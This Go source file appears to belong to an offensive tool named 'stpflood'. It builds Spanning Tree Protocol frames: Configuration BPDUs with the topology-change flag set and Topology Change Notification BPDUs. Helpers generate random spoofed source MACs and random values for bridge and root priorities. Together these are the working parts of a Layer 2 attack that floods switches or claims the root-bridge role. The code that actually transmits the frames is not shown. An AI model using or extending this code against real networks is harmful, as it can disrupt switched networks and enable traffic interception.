package stpflood

import (
	"crypto/rand"
	"encoding/binary"
)

const (
	stpFloodTag = "\x1b[33m[STP]\x1b[0m" // yellow

	bpduConfSTP       = 0x00
	bpduTCN           = 0x80
	stpVersion        = 0x00
	stpTopologyChange = 0x01

	defaultPortID      = 0x8002
	defaultMaxAge      = 20
	defaultHelloTime   = 2
	defaultForwardDelay = 15
)

var stpMulticast = [6]byte{0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}

// buildConfFrame builds an IEEE 802.3 LLC STP Configuration BPDU.
func buildConfFrame(srcMAC [6]byte, rootPri, bridgePri uint16) []byte {
	bpdu := make([]byte, 35)
	// [0:2] protocol id 0x0000, [2] version 0, [3] type CONFIG
	bpdu[3] = bpduConfSTP
	bpdu[4] = stpTopologyChange

	binary.BigEndian.PutUint16(bpdu[5:7], rootPri)
	copy(bpdu[7:13], srcMAC[:])
	// root path cost [13:17] = 0

	binary.BigEndian.PutUint16(bpdu[17:19], bridgePri)
	copy(bpdu[19:25], srcMAC[:])

	binary.BigEndian.PutUint16(bpdu[25:27], defaultPortID)
	putTimer(bpdu[27:29], 0) // message age
	putTimer(bpdu[29:31], defaultMaxAge)
	putTimer(bpdu[31:33], defaultHelloTime)
	putTimer(bpdu[33:35], defaultForwardDelay)

	llc := []byte{0x42, 0x42, 0x03}
	payload := append(llc, bpdu...)
	frame := make([]byte, 14+len(payload))
	copy(frame[0:6], stpMulticast[:])
	copy(frame[6:12], srcMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], uint16(len(payload)))
	copy(frame[14:], payload)
	return frame
}

// buildTCNFrame builds an IEEE 802.3 LLC STP TCN BPDU.
func buildTCNFrame(srcMAC [6]byte) []byte {
	bpdu := [4]byte{0x00, 0x00, stpVersion, bpduTCN}
	llc := []byte{0x42, 0x42, 0x03}
	payload := append(llc, bpdu[:]...)
	frame := make([]byte, 14+len(payload))
	copy(frame[0:6], stpMulticast[:])
	copy(frame[6:12], srcMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], uint16(len(payload)))
	copy(frame[14:], payload)
	return frame
}

func putTimer(b []byte, seconds int) {
	binary.BigEndian.PutUint16(b, uint16(seconds*256))
}

func randMAC() [6]byte {
	var m [6]byte
	rand.Read(m[:])
	m[0] = (m[0] & 0xFE) | 0x02
	return m
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}
